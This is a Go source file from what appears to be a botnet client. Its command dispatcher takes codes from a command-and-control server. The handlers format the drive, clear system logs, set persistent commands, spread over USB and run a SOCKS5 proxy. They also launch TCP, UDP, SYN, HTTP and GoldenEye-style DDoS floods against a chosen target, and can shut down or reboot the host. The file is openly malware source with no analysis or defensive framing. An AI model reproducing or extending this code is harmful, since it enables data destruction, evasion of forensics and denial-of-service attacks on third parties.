package core

import (
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func HandleCommands(id string, dat string, parameters string) {
	switch dat {
	case "0xREFRESH": //Refresh Info

	case "0xKC": //Kill Client
		//go CommandUpdateC2(id, "Executed...")
		time.Sleep(10 * time.Second)
		os.Exit(22)
	case "0xSOCKS": //Socks5
		if Socks5State {
			Socks5State = false
			//go CommandUpdateC2(id, "Finished")
		} else {
			Socks5State = true
			go StartSocks5(parameters)
			//go CommandUpdateC2(id, "Executed...")
		}
	case "0xCSLOGS": //Clear System Logs
		Finished := ClearSystemLogs()
		if Finished {
			//go CommandUpdateC2(id, "Finished")
		} else {
			//go CommandUpdateC2(id, "Failed")
		}
	case "0xPRCMD": //Persistent Command
		if AdminState {
			PersistentCommand(parameters)
			//go CommandUpdateC2(id, "Finished")
		} else {
			//go CommandUpdateC2(id, "Failed")
		}
	case "0xFMTC": //Format C:\
		//go CommandUpdateC2(id, "Executed...")
		time.Sleep(10 * time.Second)
		go FormatDrive()
	case "0xCPU": //Load CPU
		//go CommandUpdateC2(id, "Executed...")
		go CPULoader(runtime.NumCPU(), "1", 100)
	case "0xSPREAD": //Spread
		go lsblkUSBSPread(os.Args[0])
	case "0xDDOS": //DDOS Control STATE|MODE|THREADS|TARGET|INTERVAL|LENGTH
		settings := strings.Split(parameters, "|")
		if settings[0] == "true" {
			var Threads, Interval, Length int
			Threads, _ = strconv.Atoi(settings[2])
			Interval, _ = strconv.Atoi(settings[4])
			Length, _ = strconv.Atoi(settings[5])
			if settings[1] == "0" { //TCP Attack
				for i := 0; i < Threads; i++ {
					go TCPAttack(settings[3], Interval)
				}
			} else if settings[1] == "1" { //UDP Attack
				for i := 0; i < Threads; i++ {
					go UDPAttack(settings[3], Interval)
				}
			} else if settings[1] == "2" { //HulkAttack
				values := strings.Split(parameters, "*")
				for i := 0; i < Threads; i++ {
					go HulkAttack(values[0], values[1], Interval)
				}
			} else if settings[1] == "3" { //GoldenEye
				for i := 0; i < Threads; i++ {
					go GoldenEyeAttack(settings[3], Interval)
				}
			} else if settings[1] == "4" { //HTTP Get
				for i := 0; i < Threads; i++ {
					go HTTPGetAttack(settings[3], Interval)
				}
			} else if settings[1] == "5" { //ACE
				for i := 0; i < Threads; i++ {
					go ACEAttack(settings[3], Interval)
				}
			} else if settings[1] == "6" { //SYNFlood
				Host := strings.Split(settings[3], ":")
				Port, _ := strconv.Atoi(Host[1])
				_ = SYNFlood(Host[0], Port, 100, Threads)
			}
			DDoSEnabled = true
			go DDOSTimer(Length)
			//go CommandUpdateC2(id, "Executed...")
		} else {
			DDoSEnabled = false
			//go CommandUpdateC2(id, "Finished")
		}
	case "0xS": //Shutdown
		//go CommandUpdateC2(id, "Executed...")
		time.Sleep(10 * time.Second)
		RunCmd("poweroff")
	case "0xR": //Reboot
		//go CommandUpdateC2(id, "Executed...")
		time.Sleep(10 * time.Second)
		RunCmd("reboot")
	}
}
